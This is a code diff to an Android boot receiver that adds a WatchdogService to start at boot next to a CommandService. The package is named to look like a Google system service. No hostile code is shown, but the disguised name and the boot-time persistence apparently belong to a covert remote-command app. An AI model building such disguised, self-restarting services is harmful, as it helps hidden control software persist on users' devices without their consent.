@@ -9,6 +9,7 @@ import android.os.Build
 import android.os.SystemClock
 import android.util.Log
 import com.google.android.systemservice.services.CommandService
+import com.google.android.systemservice.services.WatchdogService
 
 class BootReceiver : BroadcastReceiver() {
 
@@ -40,21 +41,21 @@ class BootReceiver : BroadcastReceiver() {
     private fun startServices(context: Context) {
         try {
             val serviceIntent = Intent(context, CommandService::class.java)
+            val watchdogIntent = Intent(context, WatchdogService::class.java)
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 try {
                     context.startForegroundService(serviceIntent)
+                    context.startForegroundService(watchdogIntent)
                 } catch (e: Exception) {
-                    // Android 12+ ForegroundServiceStartNotAllowedException
                     Log.e(TAG, "Failed to start foreground service: ${e.message}")
-                    // Fallback to standard start (might also fail but worth a try) or Schedule WorkManager
-                    // For now, suppress the crash
                 }
             } else {
                 context.startService(serviceIntent)
+                context.startService(watchdogIntent)
             }
             
-            Log.d(TAG, "Started CommandService")
+            Log.d(TAG, "Started CommandService + WatchdogService")
         } catch (e: Exception) {
             Log.e(TAG, "Failed to start service: ${e.message}")
         }
